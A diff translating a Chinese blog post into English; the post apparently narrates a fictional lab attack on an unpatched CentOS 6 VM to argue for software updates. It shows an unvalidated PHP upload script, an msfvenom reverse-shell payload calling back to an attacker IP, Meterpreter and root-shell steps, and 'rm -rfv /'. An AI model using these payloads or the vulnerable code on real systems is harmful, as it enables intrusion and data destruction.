@@ -1,69 +1,62 @@
-# 攻击 CentOS6 虚拟机
+# Attacking CentOS6 Virtual Machines
 
 
-> 虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。
+> Although the penetration process is involved, this article's main topic is not about penetration testing. Please read it with a rational mindset.
 
-## 序
+## The reason for writing this blog post
 
-最近总听到一些声音。
+Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience.
 
-一些关于软件更新的、不同的声音。
+I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company's server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security.
 
-一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写
+My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.
 
-另一边说：持续不断的更新才能带来更好的体验
 
-我不知道哪一边是对的，但有点好奇
+## Simulation Environment
 
-我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。
-
-只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。
-
-## 模拟环境
-
-> 攻击者平台: Arch Linux
+> Attacker platform: Arch Linux
 >
 > IP: 192.168.0.109
 >
-> 受害平台: CentOS 6.1 on VirtualBox
+> Victim platform: CentOS 6.1 on VirtualBox
 >
 > IP: 192.168.0.116
 
-**假如**这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）
+**Suppose** this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time.
 
-我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。
+We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures.
 
-由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。
+Additionally, due to unsatisfactory work hours, the programmers have a "get the job done" attitude, resulting in PHP code on the backend such as this:
 
-外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样
 ```php
 <?php
 if ($_FILES["file"]["error"] > 0)
 {
-    echo "错误：" . $_FILES["file"]["error"] . "<br>";
+    echo "Error: " . $_FILES["file"]["error"] . "<br>";
 }
 else
 {
-    echo "上传文件名: " . $_FILES["file"]["name"] . "<br>";
-    echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
-    echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
-    echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"];
+    echo "Uploaded file name: " . $_FILES["file"]["name"] . "<br>";
+    echo "File type: " . $_FILES["file"]["type"] . "<br>";
+    echo "File size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
+    echo "Temporary storage location of file: " . $_FILES["file"]["tmp_name"];
     move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
-    echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];
+    echo "File stored in: " . "upload/" . $_FILES["file"]["name"];
 }
 ?>
 ```
 
-> 由于条件有限，只能模拟到这个程度，但我个人认为~~足以进行抽象测试了~~(逃
+> Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes.
 
-## 攻击过程
 
-总有人喜欢搞破坏，一名黑客对服务器进行了扫描... 
+## Process of attack
+
+Someone always likes to cause trouble, and a hacker has scanned the server...
 ```bash
 $ sudo nmap -O -v 192.168.0.116
 ```
 
-结果是这样的
+The result is as follows:
 ```txt
 Nmap scan report for 192.168.0.116
 Host is up (0.00028s latency).
@@ -87,31 +80,30 @@ Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
            Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
 ```
 
-他惊讶地发现内核版本居然才 `2.6.32`，这样的事他还是第一次见。 
+He was surprised to find that the kernel version was only `2.6.32`, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity.
 
-除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。
+He attempted to access the website and discovered a file upload point on the site.
 
-他试图访问了网站，在网站上发现了一个文件上传点。
 
 ![](/img/2020-09-26_21-18.png)
 
-抱着试试看的态度，用 msf 生成了一个 payload
+With a "let's give it a try" attitude, he generated a payload using msf.
 ```bash
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php
 ```
 
-选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
+He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location.
 ![](/img/2020-09-26_21-22.png)
 
-于是他启动了 `msfconsole`
+So he launched `msfconsole`.
 ```bash
 $ msfconsole
 ```
-并使用  `exploit/multi/handler` 这个模块
+And he used the exploit/multi/handler module.
 ```txt
 msf5 > use exploit/multi/handler 
 ```
-依次设置好参数
+He then proceeded to set the parameters one by one.
 ```txt
 msf5 exploit(multi/handler) > set LHOST 192.168.0.109
 ```
@@ -124,23 +116,24 @@ msf5 exploit(multi/handler) > set LPORT 4444
 set payload php/meterpreter/reverse_tcp
 ```
 
-最后一步就是运行模块了，
+The final step was to run the module.
+
 ```txt
 msf5 exploit(multi/handler) > run
 ```
 
-然后 msf 开始监听。
+Then msf began listening.
 ```txt
 
 [*] Started reverse TCP handler on 192.168.0.109:4444 
 
 ```
 
-这时他将提示出的文件地址和链接改一下，并访问
+At this point, he modified the file address and link as prompted and accessed it:
 
 >`http://192.168.0.116/upload/shell.php`
 
-msf 立刻就有了结果，可想而知，服务器的安全措施有多差
+Msf immediately produced results. It's easy to imagine how poor the server's security measures were.
 
 ```txt
 [*] Started reverse TCP handler on 192.168.0.109:4444 
@@ -150,8 +143,8 @@ msf 立刻就有了结果，可想而知，服务器的安全措施有多差
 meterpreter > 
 ```
 
-现在他开始获取系统简要信息
-* 系统、内核版本
+Now he began retrieving brief system information, such as the `operating system` and `kernel version`.
+
 ```txt
 meterpreter > sysinfo
 Computer    : localhost
@@ -161,35 +154,36 @@ meterpreter > cat /etc/issue
 CentOS release 6.10 (Final)
 Kernel \r on an \m
 ```
-* 当前控制的用户权限
+He also attempted to determine the current user's privileges.
 ```txt
 meterpreter > getuid
 Server username: apache (48)
 ```
 
-权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。
+The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants.
 
-由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。
+Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all.
 
-看起来他需要想想其他办法。
+It looks like he needs to think of another way.
 
-他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。
+During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker.
 
-一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。
+By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor.
 
-上面写着一些数字和字母，也许是什么有用的东西。
+There were some numbers and letters written on it, perhaps something useful.
 
-趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。
+While the employees were eating, he secretly took a picture of the note with his phone and left.
 
-比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。
+As luck would have it, this note contained the password that had just been changed and would not be updated again for a while.
 
-下班后回到终端，尝试着用偷窥来的密码直接登陆 root 
+After work, he returned to his terminal and attempted to log in directly as root using the stolen password.
+
 ```txt
 meterpreter > shell
 Process 1376 created.
 Channel 2 created.
 ```
-获得交互 shell
+He was able to obtain an interactive shell.
 ```txt
 /bin/sh -i
 sh: no job control in this shell
@@ -197,7 +191,7 @@ sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
 bash-4.1$ 
 ```
-进行登录
+He logged in successfully.
 ```txt
 bash-4.1$ su root
 su root
@@ -206,7 +200,8 @@ Password: ************
 [root@localhost upload]# 
 ```
 
-可见，一口气便登录成功，root 权限到了他的手里。
+As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips.
+
 
 ```txt
 [root@localhost upload]# whoami
@@ -218,37 +213,34 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
 [root@localhost upload]# 
 ```
 
-接下来他便可以为所欲为了..
+Yes, he could do whatever he wanted now...
 
-对，他最后进行了删库
+And so, in the end, he proceeded to delete everything.
+
 ```txt
 [root@localhost upload]# rm -rfv /
 ```
-最后导致公司损失巨大..
+The company suffered significant losses as a result.
 
-## 结语
+## Conclusion
 
-虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。
+Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see...
 
-但却值得我们思考，就我们能看到的来看...
+* Systems that are not updated are prone to attacks.
+* Code that is not updated is prone to vulnerabilities.
+* Slow password updates can lead to leaks.
+* Vulnerabilities must be fixed by updating software; otherwise, they will be exploited.
 
-* 系统不更新容易被攻击
-* 代码不更新容易出漏洞
-* 密码更新太慢容易泄露
-* 漏洞以更新来修复，不修则被利用
+And as for what we cannot see...
 
-而我们看不到的...
+Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations.
 
-软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？
+Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option.
 
-不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。
+For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten.
 
-而不能站立不动甚至往回走。
+Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.
 
-物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。
-
-甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..
-
-以上，只是个人想法，若有不当之处，请在下面的评论插件中 ~~喷我~~ 纠正。
+The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below.
 
 
